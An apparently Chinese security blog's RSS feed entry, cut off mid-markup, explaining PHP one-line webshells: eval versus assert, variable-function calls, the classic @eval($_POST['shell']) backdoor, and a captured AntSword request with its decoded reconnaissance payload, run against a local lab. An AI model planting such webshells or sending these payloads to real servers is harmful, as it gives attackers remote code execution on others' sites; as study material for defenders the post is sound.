<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>Hexo • Posts by &#34;web安全&#34; category</title>
        <link>http://example.com</link>
        <description></description>
        <language>en</language>
        <pubDate>Sat, 31 Dec 2022 13:38:45 +0800</pubDate>
        <lastBuildDate>Sat, 31 Dec 2022 13:38:45 +0800</lastBuildDate>
        <category>XSS</category>
        <category>SQL injection</category>
        <category>File upload</category>
        <category>汇编</category>
        <category>逆向</category>
        <item>
            <guid isPermalink="true">http://example.com/2022/12/31/webshell/</guid>
            <title>webshell</title>
            <link>http://example.com/2022/12/31/webshell/</link>
            <pubDate>Sat, 31 Dec 2022 13:38:45 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;php-webshell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-webshell&#34;&gt;#&lt;/a&gt; php webshell&lt;/h1&gt;
&lt;h2 id=&#34;eval与assert一句话木马分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#eval与assert一句话木马分析&#34;&gt;#&lt;/a&gt; eval 与 assert 一句话木马分析&lt;/h2&gt;
&lt;p&gt;实验环境:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;php:5.4.45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;mysql:5.5.62&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;注意：这小节中使用 php5 作为 php 实验环境，但 php5 和 php7 在一些函数中有改变，会在下一小节详细叙述&lt;/p&gt;
&lt;h3 id=&#34;eval定义和用法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#eval定义和用法&#34;&gt;#&lt;/a&gt; eval 定义和用法&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;eval () 函数把字符串按照 PHP 代码来计算（计算 = 执行）。&lt;/p&gt;
&lt;p&gt;该字符串必须是合法的 PHP 代码，且必须以分号结尾。&lt;/p&gt;
&lt;p&gt;如果没有在代码字符串中调用 return 语句，则返回 NULL。如果代码中存在解析错误，则 eval () 函数返回 false&lt;/p&gt;
&lt;p&gt;返回语句会立即终止对字符串的计算。&lt;/p&gt;
&lt;p&gt;注释：该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;assert的定义与用法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#assert的定义与用法&#34;&gt;#&lt;/a&gt; assert 的定义与用法&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;assert () 功能是判断一个表达式是否成立，返回 true or false，重点是函数会执行此表达式。如果表达式为函数如 assert (“echo (1)”)，则会输出 1，而如果 assert (“echo 1;”) 则不会有输出。&lt;/p&gt;
&lt;p&gt;assert 把整个字符串参数当 php 代码执行&lt;/p&gt;
&lt;p&gt;assert 在 php 中被认为是一个函数&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;eval与assert的区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#eval与assert的区别&#34;&gt;#&lt;/a&gt; eval 与 assert 的区别&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;二者都可以执行 PHP 语句。（eval 规范更加严格一些，必须符合 PHP 代码要求。而 assert 则没有那么严格，执行 PHP 表达式即可。并不是对 assert 无计可施，可以采用 assert_option () 来进行对 assert 的控制）但是在生产环境强烈建议不使用 assert 函数 (哪怕对其限制，也并不安全)。&lt;/p&gt;
&lt;p&gt;都常被用来写一句话木马&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;eval 是一个&lt;strong&gt;语言构造器&lt;/strong&gt;（是 PHP 自身的语言结构）而不是一个函数，&lt;strong&gt;不能被可变函数调用&lt;/strong&gt;；assert 在 php 中被认为是一个函数，能被可变函数调用。&lt;/p&gt;
&lt;p&gt;eval 规范更加严格一些，必须符合 PHP 代码要求，assert 则没有那么严格，执行 PHP 表达式即可&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;php可变函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php可变函数&#34;&gt;#&lt;/a&gt; php 可变函数&lt;/h3&gt;
&lt;p&gt;PHP 支持变量函数：通过变量保存一个函数的名字，然后在变量后跟上一个小括号就能调用。变量函数可以用来编写 webshell 绕过。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function website()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo &amp;#x27;C语言中文网&amp;lt;br&amp;gt;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function url($str = &amp;#x27;&amp;#x27;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo $str.&amp;#x27;&amp;lt;br&amp;gt;&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function title($string)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        echo $string;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $funcname = &amp;#x27;website&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $funcname();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $funcname = &amp;#x27;url&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $funcname(&amp;#x27;http://c.biancheng.net/php/&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $funcname = &amp;#x27;title&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $string = &amp;#x27;PHP 教程&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    $funcname($string);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;C语言中文网&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://c.biancheng.net/php/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;PHP 教程&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;php-语法构造器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php-语法构造器&#34;&gt;#&lt;/a&gt; php 语法构造器&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;php 语法构造器不能被可变函数调用&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;eval 属于 PHP 语法构造的一部分，并不是一个函数，所以不能通过变量函数的形式来调用（虽然她确实像极了函数原型），这样的语法构造还包括：echo，print，unset ()，isset ()，empty ()，include，require 等。换句话说就是 echo，print，unset ()，isset ()，empty ()，include，require 等语言结构不能被可变函数调用。&lt;/p&gt;
&lt;p&gt;PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。可变函数可以用来实现包括回调函数，函数表在内的一些用途。&lt;/p&gt;
&lt;p&gt;print 和 print_r 在 PHP 中都起打印语句的作用， &lt;code&gt;print&lt;/code&gt; &lt;strong&gt; 属于不能被可变函数调用的那一类，&lt;/strong&gt; &lt;code&gt;print_r&lt;/code&gt; &lt;strong&gt; 属于能被可变函数调用的那一类。&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$b = &amp;#x27;print_r&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$b(&amp;#x27;print_r 能被可变函数调用 &amp;lt;br&amp;gt;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a = &amp;#x27;print&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a(&amp;#x27;print 不能被可变函数调用 &amp;lt;br&amp;gt;&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;print_r 能被可变函数调用&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Fatal error: Call to undefined function print() in D:\wwwroot\www.shinya.com\printr.php on line 6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;eval 和 assert 都可以执行 PHP 语句， &lt;code&gt;eval&lt;/code&gt; &lt;strong&gt; 属于不能被可变函数调用的那一类，&lt;/strong&gt; &lt;code&gt;assert&lt;/code&gt; &lt;strong&gt; 属于能被可变函数调用的那一类。&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;$c = &amp;#x27;eval&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$c(phpinfo());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//Fatal error: Call to undefined function eval() in D:\wwwroot\www.shinya.com\printr.php on line 3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$d = &amp;#x27;assert&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$d(phpinfo());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;//PHP Version 5.4.45&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这么看来 eval 其实并不能算是‘函数’，而是 PHP 自身的语言结构，如果需要用‘可变’的方式调用，需要自己构造，类似这样子的：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;function eval_1($str)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   eval($str);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a=&amp;#x27;eval_1&amp;#x27;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$a(&amp;#x27;phpinfo()&amp;#x27;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;strong&gt;eval 其实是 Zend 的函数，而 assert 是 PHP_FUNCTION 宏编写的，最后在调用上是不同的。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;一句话木马的原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一句话木马的原理&#34;&gt;#&lt;/a&gt; 一句话木马的原理&lt;/h3&gt;
&lt;p&gt;利用文件上传漏洞，往目标网站中上传一句话木马，然后你就可以在本地通过蚁剑等 webshell 工具即可获取和控制整个网站目录。&lt;/p&gt;
&lt;p&gt;php 一句话木马:&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php @eval($_POST[&amp;#x27;shell&amp;#x27;]);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;@表示后面即使执行错误，也不报错。eval（）函数表示括号内的语句字符串什么的全都当做代码执行。$_POST [‘shell’] 表示 shell 的取值为 HTTP 的 POST 方式。即通过 eval () 函数执行 shell 里面的内容，并且不报错。&lt;/p&gt;
&lt;p&gt;中国蚁剑也同时 post 了 xian 这个数据为 %40ini_set 之类的数据，而我们又必须清楚一点，我们的 eval 函数中参数是字符，assert 函数中参数为表达式 （或者为函数），如：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;assert(eval(‘echo 1;’));//类似这样&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1=assert&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2=eval(base64_decode())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$_POST[&amp;#x27;1&amp;#x27;]($_POST[2])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;assert(eval(base64_decode))&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;_post1_post2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#_post1_post2&#34;&gt;#&lt;/a&gt; \_POST\[&#39;1&#39;](_POST[‘2’]);&lt;/h3&gt;
&lt;p&gt;post 传入参数  &lt;code&gt;1=assert&amp;amp;2=phpinfo();&lt;/code&gt;  phpinfo () 被执行，证明木马可用&lt;/p&gt;
&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219115041090.png&#34; alt=&#34;image-20221219115041090&#34; style=&#34;zoom:80%;&#34; /&gt;
&lt;h4 id=&#34;连接方式一&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#连接方式一&#34;&gt;#&lt;/a&gt; &lt;strong&gt;连接方式一：&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219115254130.png&#34; alt=&#34;image-20221219115254130&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221219115339983.png&#34; alt=&#34;image-20221219115339983&#34;&gt;&lt;/p&gt;
&lt;p&gt;连接密码和下面的 $_POST 中的内容一致，编码可选，不影响连接&lt;/p&gt;
&lt;p&gt;payload 分析：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;POST /uuuu.php HTTP/1.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Host: 127.0.0.1:18888&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: antSword/v2.1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 1026&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Connection: close&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1=assert&amp;amp;2=eval(%24_POST%5B&amp;#x27;shabi&amp;#x27;%5D)&amp;amp;shabi=%40ini_set(%22display_errors%22%2C%20%220%22)%3B%40set_time_limit(0)%3Bfunction%20asenc(%24out)%7Breturn%20%24out%3B%7D%3Bfunction%20asoutput()%7B%24output%3Dob_get_contents()%3Bob_end_clean()%3Becho%20%2204e9a%22%3Becho%20%40asenc(%24output)%3Becho%20%22d18a2%22%3B%7Dob_start()%3Btry%7B%24D%3Ddirname(%24_SERVER%5B%22SCRIPT_FILENAME%22%5D)%3Bif(%24D%3D%3D%22%22)%24D%3Ddirname(%24_SERVER%5B%22PATH_TRANSLATED%22%5D)%3B%24R%3D%22%7B%24D%7D%09%22%3Bif(substr(%24D%2C0%2C1)!%3D%22%2F%22)%7Bforeach(range(%22C%22%2C%22Z%22)as%20%24L)if(is_dir(%22%7B%24L%7D%3A%22))%24R.%3D%22%7B%24L%7D%3A%22%3B%7Delse%7B%24R.%3D%22%2F%22%3B%7D%24R.%3D%22%09%22%3B%24u%3D(function_exists(%22posix_getegid%22))%3F%40posix_getpwuid(%40posix_geteuid())%3A%22%22%3B%24s%3D(%24u)%3F%24u%5B%22name%22%5D%3A%40get_current_user()%3B%24R.%3Dphp_uname()%3B%24R.%3D%22%09%7B%24s%7D%22%3Becho%20%24R%3B%3B%7Dcatch(Exception%20%24e)%7Becho%20%22ERROR%3A%2F%2F%22.%24e-%3EgetMessage()%3B%7D%3Basoutput()%3Bdie()%3B&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;urldecode 后的 payload：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1=assert&amp;amp;2=eval($_POST[&amp;#x27;shabi&amp;#x27;])&amp;amp;shabi=@ini_set(&amp;quot;display_errors&amp;quot;, &amp;quot;0&amp;quot;);@set_time_limit(0);function asenc($out)&amp;#123;return $out;&amp;#125;;function asoutput()&amp;#123;$output=ob_get_contents();ob_end_clean();echo &amp;quot;04e9a&amp;quot;;echo @asenc($output);echo &amp;quot;d18a2&amp;quot;;&amp;#125;ob_start();try&amp;#123;$D=dirname($_SERVER[&amp;quot;SCRIPT_FILENAME&amp;quot;]);if($D==&amp;quot;&amp;quot;)$D=dirname($_SERVER[&amp;quot;PATH_TRANSLATED&amp;quot;]);$R=&amp;quot;&amp;#123;$D&amp;#125;	&amp;quot;;if(substr($D,0,1)!=&amp;quot;/&amp;quot;)&amp;#123;foreach(range(&amp;quot;C&amp;quot;,&amp;quot;Z&amp;quot;)as $L)if(is_dir(&amp;quot;&amp;#123;$L&amp;#125;:&amp;quot;))$R.=&amp;quot;&amp;#123;$L&amp;#125;:&amp;quot;;&amp;#125;else&amp;#123;$R.=&amp;quot;/&amp;quot;;&amp;#125;$R.=&amp;quot;	&amp;quot;;$u=(function_exists(&amp;quot;posix_getegid&amp;quot;))?@posix_getpwuid(@posix_geteuid()):&amp;quot;&amp;quot;;$s=($u)?$u[&amp;quot;name&amp;quot;]:@get_current_user();$R.=php_uname();$R.=&amp;quot;	&amp;#123;$s&amp;#125;&amp;quot;;echo $R;;&amp;#125;catch(Exception $e)&amp;#123;echo &amp;quot;ERROR://&amp;quot;.$e-&amp;gt;getMessage();&amp;#125;;asoutput();die();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;1=assert&amp;amp;2=eval($_POST[&#39;shell&#39;])&lt;/code&gt;  这部分代码与  &lt;code&gt;$_POST[&#39;1&#39;]($_POST[&#39;2&#39;]);&lt;/code&gt;  构成了一句话木马。等价于下列的代码：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;assert(eval($_POST[&amp;#x27;shabi&amp;#x27;]));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过 shabi 这个自己设立的变量传递参数，eval () 会执行 shabi 中参数的内容。&lt;/p&gt;
&lt;p&gt;shell=@ini_set(“display_errors”,“0”);@set_time_limit(0);&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;o&lt;/mi&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;@&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;g&lt;/mi&gt;&lt;/msub&gt;&lt;mi&gt;e&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;(&lt;/mo&gt;&lt;mi 